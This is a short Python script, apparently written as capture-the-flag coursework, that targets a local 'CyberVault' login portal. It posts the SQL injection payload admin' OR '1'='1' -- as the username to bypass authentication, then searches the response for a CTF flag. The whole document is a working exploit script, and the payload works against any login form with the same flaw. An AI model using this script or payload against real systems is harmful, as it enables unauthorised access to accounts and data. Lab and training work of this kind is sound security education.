#!/usr/bin/env python3
"""
Member 2 - LO3 Automated SQL Injection Exploit Script for Stage 3
Target: Stage 3 CyberVault Internal Portal
Vulnerability: SQL Injection Authentication Bypass
"""
import requests
import re
import sys

TARGET_URL = "http://localhost:8081/index.php"

def exploit_sqli(url):
    print(f"[*] Targeting CyberVault Authentication Portal: {url}")
    session = requests.Session()

    # Classic SQLi bypass payload for SQLite
    payload = "admin' OR '1'='1' --"
    data = {
        "username": payload,
        "password": "arbitrary_password"
    }

    print(f"[*] Dispatching SQL injection payload: {payload}")
    response = session.post(url, data=data, allow_redirects=True)

    if "CTF{" in response.text:
        match = re.search(r'CTF\{[A-Za-z0-9_]+\}', response.text)
        if match:
            print(f"[+] Exploitation Successful! Session established.")
            print(f"[+] RECOVERED FLAG: {match.group(0)}")
            return match.group(0)
    
    print("[-] Exploit payload did not trigger flag recovery.")
    return None

if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv) > 1 else TARGET_URL
    exploit_sqli(url)